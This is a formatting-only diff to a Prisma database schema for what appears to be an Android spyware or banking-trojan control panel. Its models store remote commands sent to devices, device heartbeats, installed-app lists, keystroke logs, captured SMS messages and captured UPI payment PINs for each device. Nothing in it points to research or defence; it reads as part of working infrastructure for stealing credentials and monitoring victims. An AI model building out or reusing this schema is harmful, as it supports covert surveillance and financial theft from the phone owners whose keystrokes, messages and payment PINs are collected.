@@ -16,19 +16,18 @@ model DeviceCommand {
   created_at   DateTime? @default(now()) @db.Timestamptz
   delivered_at DateTime? @db.Timestamptz
   executed_at  DateTime? @db.Timestamptz
-
   device       Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
 
   @@map("device_commands")
 }
 
 model Device {
-  device_id          String    @id
+  device_id          String          @id
   android_id         String?
   manufacturer       String?
   model              String?
-  status             Boolean?  @default(false)
-  last_seen          DateTime? @db.Timestamptz
+  status             Boolean?        @default(false)
+  last_seen          DateTime?       @db.Timestamptz
   brand              String?
   product            String?
   android_version    String?
@@ -39,15 +38,14 @@ model Device {
   power_save_status  Json?
   screen_status      Json?
   process_importance String?
-  created_at         DateTime? @default(now()) @db.Timestamptz
-  updated_at         DateTime? @default(now()) @db.Timestamptz
-
-  commands       DeviceCommand[]
-  heartbeats     Heartbeat[]
-  installed_apps InstalledApp[]
-  key_logs       KeyLog[]
-  sms_messages   SmsMessage[]
-  upi_pins       UpiPin[]
+  created_at         DateTime?       @default(now()) @db.Timestamptz
+  updated_at         DateTime?       @default(now()) @db.Timestamptz
+  commands           DeviceCommand[]
+  heartbeats         Heartbeat[]
+  installed_apps     InstalledApp[]
+  key_logs           KeyLog[]
+  sms_messages       SmsMessage[]
+  upi_pins           UpiPin[]
 
   @@map("devices")
 }
@@ -61,7 +59,6 @@ model Heartbeat {
   ram         BigInt    @default(0)
   created_at  DateTime? @default(now()) @db.Timestamptz
   updated_at  DateTime? @default(now()) @db.Timestamptz
-
   device      Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
 
   @@map("heartbeat")
@@ -76,13 +73,12 @@ model InstalledApp {
   version_code       BigInt?
   first_install_time BigInt?
   last_update_time   BigInt?
-  is_system_app      Boolean? @default(false)
+  is_system_app      Boolean?  @default(false)
   target_sdk         Int?
   min_sdk            Int?
   sync_timestamp     BigInt
   created_at         DateTime? @default(now()) @db.Timestamptz
   updated_at         DateTime? @default(now()) @db.Timestamptz
-
   device             Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
 
   @@id([device_id, package_name])
@@ -90,14 +86,13 @@ model InstalledApp {
 }
 
 model KeyLog {
-  id           String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
-  device_id    String
-  key          String
-  keylogger    String
-  created_at   DateTime  @default(now()) @db.Timestamptz
-  currentDate  DateTime? @map("currentDate") @db.Timestamptz
-
-  device       Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
+  id          String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  device_id   String
+  key         String
+  keylogger   String
+  created_at  DateTime  @default(now()) @db.Timestamptz
+  currentDate DateTime? @map("currentDate") @db.Timestamptz
+  device      Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
 
   @@map("key_logger")
 }
@@ -113,7 +108,6 @@ model SmsMessage {
   sync_status String?   @default("synced")
   created_at  DateTime? @default(now()) @db.Timestamptz
   updated_at  DateTime? @default(now()) @db.Timestamptz
-
   device      Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
 
   @@id([id, device_id])
@@ -121,13 +115,12 @@ model SmsMessage {
 }
 
 model UpiPin {
-  id           String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
-  device_id    String
-  pin          String
-  created_at   DateTime  @default(now()) @db.Timestamptz
-  currentDate  DateTime? @map("currentDate") @db.Timestamptz
-
-  device       Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
+  id          String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  device_id   String
+  pin         String
+  created_at  DateTime  @default(now()) @db.Timestamptz
+  currentDate DateTime? @map("currentDate") @db.Timestamptz
+  device      Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
 
   @@map("upi_pins")
 }
